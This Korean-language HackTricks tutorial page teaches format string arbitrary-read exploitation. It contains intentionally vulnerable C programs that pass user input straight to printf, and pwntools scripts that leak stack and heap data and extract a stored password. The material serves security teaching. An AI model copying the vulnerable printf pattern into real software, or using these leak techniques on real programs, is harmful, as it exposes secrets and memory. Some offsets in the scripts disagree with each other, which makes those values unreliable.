# 포맷 문자열 - 임의 읽기 예제

<details>

<summary><strong>제로에서 영웅까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team 전문가)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소를 이용하세요.

</details>

## 이진 시작 읽기

### 코드
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
다음과 같이 컴파일하십시오:
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### 악용
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
* **오프셋은 11**입니다. 여러 개의 A를 설정하고 루프로 **무차별 대입**을 하여 오프셋을 0부터 50까지 찾은 결과, 오프셋 11에서 5개의 추가 문자(우리의 경우 파이프 `|`)로 완전한 주소를 제어할 수 있었습니다.
* 주소가 모두 0x4141414141414141인 것을 확인하기 위해 **`%11$p`**를 사용하고 패딩을 사용했습니다.
* **포맷 문자열 페이로드는 주소 앞에** 있습니다. 왜냐하면 **printf는 널 바이트에서 읽기를 멈추기 때문에**, 주소를 보낸 다음 포맷 문자열을 보내면 printf가 포맷 문자열에 도달하지 못할 것입니다. 널 바이트가 먼저 발견될 것입니다.
* 선택한 주소는 0x00400000입니다. 바이너리가 시작되는 곳이기 때문에 (PIE가 없음)
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
다음과 같이 컴파일하십시오:
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### 스택에서 읽기

**`stack_password`**는 로컬 변수이기 때문에 스택에 저장됩니다. 따라서 printf를 남용하여 스택의 내용을 표시하는 것만으로 충분합니다. 이것은 스택에서 비밀번호를 노출시키기 위해 처음 100개 위치를 노출하는 공격입니다:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
### 데이터 읽기

동일한 취약점을 실행하지만 `%s` 대신 `%p`를 사용하면 `%25$p`에서 스택의 힙 주소를 노출시킬 수 있습니다. 더불어 노출된 주소(`0xaaaab7030894`)를 해당 프로세스의 메모리에서 비밀번호 위치와 비교하여 주소 차이를 얻을 수 있습니다:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

이제 스택에서 주소 1개를 제어하는 방법을 찾아 두 번째 형식 문자열 취약점에서 액세스할 수 있는지 확인할 차례입니다:
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
그리고 사용된 전달로 **try 14**에서 주소를 제어할 수 있다는 것을 확인할 수 있습니다:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Exploit
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

<details>

<summary><strong>영웨이 에이더블유에스 해킹을 제로부터 히어로까지 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

다른 방법으로 HackTricks를 지원하는 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터에서 **@hacktricks\_live**를 팔로우하세요 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
